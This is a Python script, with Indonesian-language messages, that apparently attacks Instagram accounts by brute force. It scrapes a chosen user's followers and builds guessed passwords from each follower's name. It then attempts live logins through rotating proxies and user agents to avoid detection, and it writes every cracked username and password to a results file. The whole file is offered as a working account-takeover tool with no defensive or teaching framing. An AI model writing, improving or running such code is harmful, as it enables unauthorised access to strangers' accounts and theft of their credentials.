import argparse
import json
import random
from colorama import Fore, init
from utils.scraper import scrape_followers
from utils.password_gen import generate_passwords
from utils.tools import login_real, load_list_from_file, get_user_info

init(autoreset=True)

def brute_force_real_mode(target_username):
    print(Fore.YELLOW + f"🔍 Scraping followers dari: {target_username} ...")
    followers = scrape_followers(target_username)
    
    if not followers:
        print(Fore.RED + "❌ Gagal scrape followers atau tidak ada followers.")
        return

    print(Fore.GREEN + f"✅ Total followers ditemukan: {len(followers)}\n")
    
    proxies = load_list_from_file("Proxy.txt")
    user_agents = load_list_from_file("User-agents.txt")

    berhasil = 0
    total = len(followers)

    for idx, user in enumerate(followers, start=1):
        username = user['username']
        full_name = user.get('full_name', '')
        passwords = generate_passwords(username, full_name)

        print(Fore.CYAN + f"🔄 [{idx}/{total}] Mencoba login: {username} ({len(passwords)} kombinasi)")

        for pwd in passwords:
            proxy = random.choice(proxies) if proxies else None
            ua = random.choice(user_agents) if user_agents else None

            success = login_real(username, pwd, user_agent=ua, proxy=proxy)
            if success:
                info = get_user_info(username)
                hasil = f"{username}|{pwd}|followers:{info['followers']}|following:{info['following']}|posts:{info['posts']}\n"
                print(Fore.GREEN + f"✅ Sukses: {hasil.strip()}")
                with open("hasil_login_berhasil.txt", "a") as f:
                    f.write(hasil)
                berhasil += 1
                break

    print(Fore.YELLOW + f"\n📊 SELESAI: {berhasil} akun berhasil login dari total {total} target.\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Username akun target (opsional, akan diminta jika tidak diberikan)")
    parser.add_argument("--mode", help="Mode: real / simulasi", choices=["real", "simulasi"], default="simulasi")
    args = parser.parse_args()

    # Input interaktif jika --target tidak diberikan
    if not args.target:
        args.target = input("Masukkan username target Instagram: ").strip()

    if args.mode == "real":
        brute_force_real_mode(args.target)
    else:
        print(Fore.YELLOW + "🔧 Mode simulasi belum diimplementasikan.")
